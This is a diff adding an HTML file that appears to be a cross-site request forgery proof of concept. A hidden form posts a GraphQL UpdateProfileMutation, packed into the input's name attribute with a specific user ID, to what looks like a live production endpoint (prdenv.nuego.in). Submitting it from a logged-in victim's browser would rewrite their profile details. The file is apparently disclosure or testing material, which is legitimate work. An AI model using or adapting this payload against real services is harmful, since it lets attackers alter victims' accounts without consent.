@@ -1,0 +1,8 @@
+<html>
+	<body>
+		<form method="POST" action="https://prdenv.nuego.in/graphql">
+			<input type="hidden" name="{"id":"UpdateProfileMutation","query":"mutation UpdateProfileMutation(\n  $userId: String!\n  $gender: ProfileGenderEnum!\n  $gstState: String\n  $name: String!\n  $registeredName: String\n  $email: String!\n  $gstin: String\n  $age: Int!\n) {\n  updateProfile(userId: $userId, gender: $gender, gstState: $gstState, name: $name, registeredName: $registeredName, email: $email, gstin: $gstin, age: $age) {\n    userDetail {\n      id\n      walletAmount\n      greenMilesAmount\n      user {\n        mobileNumber\n        username\n        firstName\n        lastName\n        email\n        isActive\n        savedcontactdetail {\n          user {\n            email\n            mobileNumber\n            firstName\n            lastName\n            id\n          }\n          id\n        }\n        id\n      }\n      profilePic\n      age\n      gender\n      registeredName\n      gstin\n      gstState\n      profilePicUrl\n    }\n  }\n}\n","variables":{"userId":"VXNlclR5cGU6NDcxNjAwNQ" value=""/>
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+<html>
